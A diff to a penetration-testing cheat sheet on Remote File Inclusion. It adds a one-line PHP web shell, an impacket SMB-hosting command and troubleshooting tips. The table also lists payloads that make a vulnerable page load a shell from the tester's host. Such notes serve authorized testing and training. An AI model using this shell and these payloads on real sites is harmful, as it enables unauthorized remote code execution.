@@ -11,9 +11,11 @@ tags:
 > [!tip] Quick Reference — RFI
 > | Step | Command |
 > |------|---------|
+> | Create PHP shell | `echo '<?php system($_GET["cmd"]); ?>' > shell.php` |
 > | Host malicious file | `python3 -m http.server 80` |
 > | Basic RFI test | `?page=http://<LHOST>/test.txt` |
 > | RFI shell | `?page=http://<LHOST>/shell.php` |
+> | Host SMB share (Windows RFI) | `sudo impacket-smbserver share . -smb2support` |
 > | SMB RFI (Windows) | `?page=\\<LHOST>\share\shell.php` |
 
 ## Decision Tree
@@ -58,6 +60,9 @@ flowchart TD
 > [!danger] Common errors
 > - Your server never gets a hit → `allow_url_include` is disabled (common); RFI won't work, switch to LFI/log poisoning or PHP wrappers.
 > - Web server not reachable → make sure `python3 -m http.server 80` runs from the directory holding the webshell and the target can reach your IP.
+> - `python3 -m http.server 80` fails with `OSError: [Errno 98] Address already in use` → a previous server/listener is still bound to that port. `sudo lsof -i :80` to find the PID, `sudo kill <PID>` (or serve on a different port and update the `?page=` URL to match).
+> - `impacket-smbserver` fails to bind (`error opening file` / address in use on 445) → Kali's own SMB service is running on port 445. Stop it first: `sudo systemctl stop smbd` (check with `sudo lsof -i :445`).
+> - SMB RFI never fires → outbound SMB (port 445) is frequently blocked by firewalls even when HTTP isn't; confirm reachability, or fall back to the HTTP-hosted `python3 -m http.server` approach.
 > - `&` or special chars mangled in the URL → wrap the URL in quotes for curl and URL-encode if needed. See [[🔣 Encoding Reference]].
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
 
